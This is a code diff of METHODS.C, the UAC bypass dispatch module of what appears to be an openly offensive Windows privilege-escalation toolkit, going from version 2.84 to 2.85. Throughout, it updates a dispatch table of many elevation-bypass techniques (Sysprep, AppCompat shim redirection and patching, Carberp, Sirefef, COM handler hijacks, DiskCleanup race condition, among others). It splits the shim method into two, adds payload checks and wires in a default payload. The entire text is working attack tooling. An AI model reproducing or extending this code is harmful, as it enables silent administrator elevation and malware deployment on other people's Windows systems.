@@ -4,9 +4,9 @@
 *
 *  TITLE:       METHODS.C
 *
-*  VERSION:     2.84
+*  VERSION:     2.85
 *
-*  DATE:        22 Nov 2017
+*  DATE:        01 Dec 2017
 *
 *  UAC bypass dispatch.
 *
@@ -20,7 +20,8 @@
 
 UCM_API(MethodTest);
 UCM_API(MethodSysprep);
-UCM_API(MethodAppCompat);
+UCM_API(MethodACRedirectEXE);
+UCM_API(MethodACBinaryPath);
 UCM_API(MethodSimda);
 UCM_API(MethodCarberp);
 UCM_API(MethodAVrf);
@@ -62,14 +63,14 @@ UCM_API_DISPATCH_ENTRY ucmMethodsDispatchTable[UCM_DISPATCH_ENTRY_MAX] = {
     { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSysprep, NULL, { 9600, 10240 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSysprep, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodAppCompat, NULL, { 7600, 10240 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
+    { MethodACRedirectEXE, NULL, { 7600, 10240 }, PAYLOAD_ID_NONE, FALSE, FALSE, FALSE },
     { MethodSimda, NULL, { 7600, 10136 }, PAYLOAD_ID_NONE, FALSE, TRUE, FALSE },
     { MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID, FALSE, FALSE, TRUE },
     { MethodCarberp, NULL, { 7600, 10147 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSysprep, NULL, { 7600, 9600 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodAVrf, NULL, { 7600, 10136 }, HIBIKI_ID, FALSE, TRUE, TRUE },
     { MethodWinsat, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
-    { MethodAppCompat, NULL, { 7600, 10240 }, FUBUKI_ID, TRUE, FALSE, TRUE },
+    { MethodACBinaryPath, NULL, { 7600, 10240 }, FUBUKI_ID, TRUE, FALSE, TRUE },
     { MethodSysprep, NULL, { 10240, 10586 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodMMC, NULL, { 7600, 14316 }, FUBUKI_ID, FALSE, TRUE, TRUE },
     { MethodSirefef, NULL, { 7600, 10548 }, FUBUKI_ID, FALSE, TRUE, TRUE },
@@ -207,6 +208,9 @@ BOOL MethodsManagerCall(
     PVOID  ImageBaseAddress = NtCurrentPeb()->ImageBaseAddress;
     PUCM_API_DISPATCH_ENTRY Entry;
 
+    if (Method >= UacMethodMax)
+        return FALSE;
+
     Entry = &ucmMethodsDispatchTable[Method];
 
     if (!IsMethodMatchRequirements(Entry))
@@ -222,7 +226,7 @@ BOOL MethodsManagerCall(
         if (Resource)
             PayloadCode = g_ctx.DecryptRoutine(Resource, DataSize, &PayloadSize);
 
-        if (PayloadCode == NULL) {
+        if ((PayloadCode == NULL) || (PayloadSize == 0)) {
             SetLastError(ERROR_INVALID_DATA);
             return FALSE;
         }
@@ -264,17 +268,50 @@ UCM_API(MethodTest)
 UCM_API(MethodSysprep)
 {
     UNREFERENCED_PARAMETER(ExtraContext);
+
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmStandardAutoElevation(Method, PayloadCode, PayloadSize);
 }
 
-UCM_API(MethodAppCompat)
+UCM_API(MethodACRedirectEXE)
 {
+    LPWSTR lpszPayload;
+
+    UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
-    return ucmAppcompatElevation(
-        Method,
-        PayloadCode,
-        PayloadSize,
-        (g_ctx.OptionalParameterLength != 0) ? g_ctx.szOptionalParameter : NULL);
+    UNREFERENCED_PARAMETER(PayloadCode);
+    UNREFERENCED_PARAMETER(PayloadSize);
+
+    if (g_ctx.OptionalParameterLength != 0)
+        lpszPayload = g_ctx.szOptionalParameter;
+    else
+        lpszPayload = g_ctx.szDefaultPayload;
+
+    return ucmShimRedirectEXE(lpszPayload);
+}
+
+UCM_API(MethodACBinaryPath)
+{
+    UNREFERENCED_PARAMETER(Method);
+    UNREFERENCED_PARAMETER(ExtraContext);
+
+#ifdef _WIN64
+    UNREFERENCED_PARAMETER(PayloadCode);
+    UNREFERENCED_PARAMETER(PayloadSize);
+
+    SetLastError(ERROR_INSTALL_PLATFORM_UNSUPPORTED);
+    return FALSE;
+#else
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
+    else
+        return ucmShimPatch(PayloadCode, PayloadSize);
+#endif
 }
 
 UCM_API(MethodSimda)
@@ -300,6 +337,11 @@ UCM_API(MethodCarberp)
 {
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
+
     //
     // Additional checking for UacMethodCarberp1. 
     // Target application 'migwiz' unavailable in Syswow64 after Windows 7.
@@ -318,6 +360,11 @@ UCM_API(MethodAVrf)
 {
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
+
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmAvrfMethod(PayloadCode, PayloadSize);
 }
 
@@ -328,6 +375,11 @@ UCM_API(MethodWinsat)
 
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
+
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
 
     //
     //  Additional checking.
@@ -356,6 +408,10 @@ UCM_API(MethodMMC)
     //  Required dll dependency not exist in x86-32
     //
 #ifdef _WIN64
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmMMCMethod(Method, ELSEXT_DLL, PayloadCode, PayloadSize);
 #else
     UNREFERENCED_PARAMETER(Method);
@@ -370,6 +426,10 @@ UCM_API(MethodMMC2)
 {
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmMMCMethod(Method, WBEMCOMN_DLL, PayloadCode, PayloadSize);
 }
 
@@ -378,6 +438,10 @@ UCM_API(MethodSirefef)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmSirefefMethod(PayloadCode, PayloadSize);
 }
 
@@ -392,6 +456,10 @@ UCM_API(MethodGeneric)
     _strcpy(szBuffer, g_ctx.szSystemDirectory);
     _strcat(szBuffer, CLICONFG_EXE);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmGenericAutoelevation(szBuffer, NTWDBLIB_DLL, PayloadCode, PayloadSize);
 }
 
@@ -400,6 +468,10 @@ UCM_API(MethodGWX)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmGWX(PayloadCode, PayloadSize);
 }
 
@@ -408,6 +480,10 @@ UCM_API(MethodSysprep4)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmStandardAutoElevation2(PayloadCode, PayloadSize);
 }
 
@@ -416,6 +492,10 @@ UCM_API(MethodManifest)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmAutoElevateManifest(PayloadCode, PayloadSize);
 }
 
@@ -440,6 +520,11 @@ UCM_API(MethodSXS)
     LPWSTR lpLaunchApplication = NULL;
 
     UNREFERENCED_PARAMETER(ExtraContext);
+
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
 
     //
     // Select parameters depending on method used.
@@ -488,6 +573,10 @@ UCM_API(MethodDism)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmDismMethod(PayloadCode, PayloadSize);
 }
 
@@ -506,7 +595,7 @@ UCM_API(MethodComet)
     if (g_ctx.OptionalParameterLength != 0)
         lpszPayload = g_ctx.szOptionalParameter;
     else
-        lpszPayload = T_DEFAULT_CMD;
+        lpszPayload = g_ctx.szDefaultPayload;
 
     return ucmCometMethod(lpszPayload);
 }
@@ -518,11 +607,6 @@ UCM_API(MethodEnigma0x3)
 
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
-
-    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
-        SetLastError(ERROR_INVALID_DATA);
-        return FALSE;
-    }
 
     //
     // Select target application.
@@ -539,7 +623,7 @@ UCM_API(MethodEnigma0x3)
         lpszPayload = g_ctx.szOptionalParameter;
     else
         lpszPayload = NULL;
-
+   
     return ucmHijackShellCommandMethod(lpszPayload, lpszTargetApp, PayloadCode, PayloadSize);
 }
 
@@ -552,13 +636,12 @@ UCM_API(MethodEnigma0x3_2)
         SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
-
     return ucmDiskCleanupRaceCondition(PayloadCode, PayloadSize);
 }
 
 UCM_API(MethodExpLife)
 {
-    WCHAR szBuffer[MAX_PATH + 1];
+    LPWSTR lpParameter;
 
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
@@ -568,13 +651,12 @@ UCM_API(MethodExpLife)
     //
     // Select target application or use given by optional parameter.
     //
-    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
     if (g_ctx.OptionalParameterLength == 0)
-        supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+        lpParameter = g_ctx.szDefaultPayload;
     else
-        _strcpy(szBuffer, g_ctx.szOptionalParameter);
+        lpParameter = g_ctx.szOptionalParameter;
 
-    return ucmUninstallLauncherMethod(szBuffer);
+    return ucmUninstallLauncherMethod(lpParameter);
 }
 
 UCM_API(MethodSandworm)
@@ -586,7 +668,6 @@ UCM_API(MethodSandworm)
         SetLastError(ERROR_INVALID_DATA);
         return FALSE;
     }
-
     return ucmSandwormMethod(PayloadCode, PayloadSize);
 }
 
@@ -603,7 +684,7 @@ UCM_API(MethodEnigma0x3_3)
     // Select target application or use given by optional parameter.
     //
     if (g_ctx.OptionalParameterLength == 0)
-        lpszPayload = NULL;
+        lpszPayload = g_ctx.szDefaultPayload;
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
@@ -619,6 +700,10 @@ UCM_API(MethodWow64Logger)
     //  Required x64 as this method abuse wow64 logger mechanism
     //
 #ifdef _WIN64
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmWow64LoggerMethod(PayloadCode, PayloadSize);
 #else
     UNREFERENCED_PARAMETER(PayloadCode);
@@ -639,7 +724,7 @@ UCM_API(MethodEnigma0x3_4)
     UNREFERENCED_PARAMETER(PayloadSize);
 
     if (g_ctx.OptionalParameterLength == 0)
-        lpszPayload = NULL;
+        lpszPayload = g_ctx.szDefaultPayload;
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
@@ -651,6 +736,10 @@ UCM_API(MethodUiAccess)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmUiAccessMethod(PayloadCode, PayloadSize);
 }
 
@@ -664,7 +753,7 @@ UCM_API(MethodMsSettings)
     UNREFERENCED_PARAMETER(PayloadSize);
 
     if (g_ctx.OptionalParameterLength == 0)
-        lpszPayload = NULL;
+        lpszPayload = g_ctx.szDefaultPayload;
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
@@ -684,7 +773,7 @@ UCM_API(MethodTyranid)
     // Select target application or use given by optional parameter.
     //
     if (g_ctx.OptionalParameterLength == 0)
-        lpszPayload = NULL;
+        lpszPayload = g_ctx.szDefaultPayload;
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
@@ -704,7 +793,7 @@ UCM_API(MethodTokenMod)
     // Select target application or use given by optional parameter.
     //
     if (g_ctx.OptionalParameterLength == 0)
-        lpszPayload = NULL;
+        lpszPayload = g_ctx.szDefaultPayload;
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
@@ -716,6 +805,10 @@ UCM_API(MethodJunction)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmJunctionMethod(PayloadCode, PayloadSize);
 }
 
@@ -724,6 +817,10 @@ UCM_API(MethodSXSDccw)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmSXSMethodDccw(PayloadCode, PayloadSize);
 }
 
@@ -733,6 +830,10 @@ UCM_API(MethodHakril)
     UNREFERENCED_PARAMETER(ExtraContext);
 
 #ifdef _WIN64
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmMethodHakril(PayloadCode, PayloadSize);
 #else
     UNREFERENCED_PARAMETER(PayloadCode);
@@ -748,6 +849,10 @@ UCM_API(MethodCorProfiler)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmMethodCorProfiler(PayloadCode, PayloadSize);
 }
 
@@ -756,12 +861,16 @@ UCM_API(MethodCOMHandlers)
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
 
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
     return ucmMethodCOMHandlers(PayloadCode, PayloadSize);
 }
 
 UCM_API(MethodCMLuaUtil)
 {
-    WCHAR szBuffer[MAX_PATH + 1];
+    LPWSTR lpParameter;
 
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
@@ -771,13 +880,12 @@ UCM_API(MethodCMLuaUtil)
     //
     // Select target application or use given by optional parameter.
     //
-    RtlSecureZeroMemory(szBuffer, sizeof(szBuffer));
     if (g_ctx.OptionalParameterLength == 0)
-        supExpandEnvironmentStrings(T_DEFAULT_CMD, szBuffer, MAX_PATH);
+        lpParameter = g_ctx.szDefaultPayload;
     else
-        _strcpy(szBuffer, g_ctx.szOptionalParameter);
+        lpParameter = g_ctx.szOptionalParameter;
 
-    return ucmCMLuaUtilShellExecMethod(szBuffer);
+    return ucmCMLuaUtilShellExecMethod(lpParameter);
 }
 
 UCM_API(MethodFwCplLua)
@@ -793,7 +901,7 @@ UCM_API(MethodFwCplLua)
     // Select target application or use given by optional parameter.
     //
     if (g_ctx.OptionalParameterLength == 0)
-        lpszPayload = NULL;
+        lpszPayload = g_ctx.szDefaultPayload;
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
@@ -813,7 +921,7 @@ UCM_API(MethodDccwCOM)
     // Select target application or use given by optional parameter.
     //
     if (g_ctx.OptionalParameterLength == 0)
-        lpszPayload = NULL;
+        lpszPayload = g_ctx.szDefaultPayload;
     else
         lpszPayload = g_ctx.szOptionalParameter;
 
@@ -824,6 +932,11 @@ UCM_API(MethodVolatileEnv)
 {
     UNREFERENCED_PARAMETER(Method);
     UNREFERENCED_PARAMETER(ExtraContext);
+
+    if ((PayloadCode == NULL) || (PayloadSize == 0)) {
+        SetLastError(ERROR_INVALID_DATA);
+        return FALSE;
+    }
 
     return ucmMethodVolatileEnv(PayloadCode, PayloadSize);
 }
